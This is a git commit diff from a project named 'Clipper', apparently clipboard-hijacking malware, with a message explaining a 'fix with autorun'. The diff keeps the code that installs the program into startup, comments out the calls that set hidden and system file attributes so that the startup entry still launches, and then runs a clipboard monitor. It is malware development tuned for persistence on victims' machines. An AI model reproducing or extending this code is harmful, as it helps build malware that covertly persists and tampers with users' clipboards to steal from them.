22a6bb02a2c2edbc4534afb1197a690cbc37a97d
Imperator Vladimir <L0rdL1merBoy@protonmail.com>
2020-10-04 17:34:52 +0300

    :wrench: small fix with autorun
    The features(hidden, system attributes) are disabled because 
    if the file is in the startup folder and hidden, it will not run.

--- Clipper/Clipper/Program.cs
+++ Clipper/Clipper/Program.cs
@@ -12,9 +12,13 @@ namespace Clipper
             // Add to startup
             if (!Modules.Autorun.is_installed())
                 Modules.Autorun.install();
-            // Set hidden & system attributes
-            Modules.Attributes.set_hidden();
-            Modules.Attributes.set_system();
+            
+            /* The functions are disabled because if the file is in the startup folder and it is hidden,
+               then it will not be launched.
+               // Set hidden & system attributes
+               Modules.Attributes.set_hidden();
+               Modules.Attributes.set_system(); */
+            
             // Start clipper
             Modules.ClipboardMonitor.run();
         }
